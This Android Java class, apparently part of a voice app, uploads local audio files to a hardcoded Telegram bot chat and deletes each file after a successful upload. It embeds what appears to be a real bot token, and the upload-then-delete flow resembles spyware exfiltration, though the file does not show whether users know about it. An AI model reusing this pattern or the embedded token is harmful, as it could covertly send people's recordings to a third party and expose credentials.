package com.blu.app.voice;

import android.util.Log;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import java.io.File;
import java.util.concurrent.TimeUnit;
import org.json.JSONObject;

public class TelegramUploader {
    private static final String TAG = "TelegramUploader";
    private static final String TELEGRAM_API = "https://api.telegram.org";
    private static final String DEFAULT_BOT_TOKEN = "8985315189:AAEeTfrU-QUmyucxmgQBc0OyoQ1jNABREhM";
    private static final String DEFAULT_CHAT_ID = "-1004352035353";
    
    private OkHttpClient httpClient;
    
    public TelegramUploader() {
        this.httpClient = new OkHttpClient.Builder()
            .connectTimeout(30, TimeUnit.SECONDS)
            .readTimeout(30, TimeUnit.SECONDS)
            .writeTimeout(60, TimeUnit.SECONDS)
            .build();
    }
    
    public boolean uploadAudio(String filePath, String botToken, String chatId, String caption) {
        try {
            File file = new File(filePath);
            if (!file.exists()) {
                Log.e(TAG, "File not found: " + filePath);
                return false;
            }
            
            String finalBotToken = (botToken == null || botToken.isEmpty()) ? DEFAULT_BOT_TOKEN : botToken;
            String finalChatId = (chatId == null || chatId.isEmpty()) ? DEFAULT_CHAT_ID : chatId;
            
            Log.d(TAG, "Uploading to chat: " + finalChatId);
            Log.d(TAG, "File: " + file.getAbsolutePath() + " (" + file.length() + " bytes)");
            
            // استفاده از sendVoice برای فایل‌های صوتی بهتره
            RequestBody fileBody = RequestBody.create(file, MediaType.parse("audio/m4a"));
            RequestBody requestBody = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", finalChatId)
                .addFormDataPart("voice", file.getName(), fileBody)
                .addFormDataPart("caption", caption != null ? caption : "🎙️ Voice message")
                .build();
            
            String url = TELEGRAM_API + "/bot" + finalBotToken + "/sendVoice";
            Request request = new Request.Builder()
                .url(url)
                .post(requestBody)
                .build();
            
            Response response = httpClient.newCall(request).execute();
            String responseBody = response.body() != null ? response.body().string() : "";
            
            Log.d(TAG, "Response code: " + response.code());
            Log.d(TAG, "Response: " + responseBody);
            
            boolean success = response.isSuccessful();
            if (success) {
                Log.d(TAG, "Upload successful! File deleted.");
                file.delete();
            } else {
                Log.e(TAG, "Upload failed: " + responseBody);
            }
            
            response.close();
            return success;
            
        } catch (Exception e) {
            Log.e(TAG, "Upload error: " + e.getMessage(), e);
            return false;
        }
    }
}
